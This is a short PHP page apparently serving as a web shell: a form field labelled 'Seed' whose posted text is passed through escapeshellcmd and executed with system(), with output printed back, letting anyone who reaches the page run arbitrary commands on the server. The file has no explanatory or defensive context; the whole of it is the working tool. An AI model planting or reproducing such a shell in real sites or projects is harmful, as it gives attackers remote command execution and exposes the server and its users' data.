<?php
if($_SERVER["REQUEST_METHOD"] === 'POST')
{
  $command = escapeshellcmd($_POST['input_cmd']);

  echo "<pre>";
  $last_line = system($command, $return_var);
  echo "</pre>";
}
?>

<form method="post">
  <input type="text" name="input_cmd">
  <button type="submit">Seed</button>
</form>
